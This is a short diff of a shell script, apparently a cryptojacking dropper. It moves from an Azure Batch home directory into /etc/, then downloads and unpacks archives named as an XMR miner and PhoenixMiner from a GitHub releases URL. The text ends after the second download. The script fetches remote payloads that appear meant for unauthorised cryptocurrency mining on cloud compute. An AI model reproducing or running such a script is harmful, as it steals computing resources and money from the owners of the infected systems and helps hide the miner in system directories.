@@ -1,5 +1,5 @@
 #!/bin/sh
-cd /home/_azbatch
+cd /etc/
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
 tar -zxvf winxmr.tar.gz
 wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/PhoenixMiner_5.6d_Linux.tar.gz
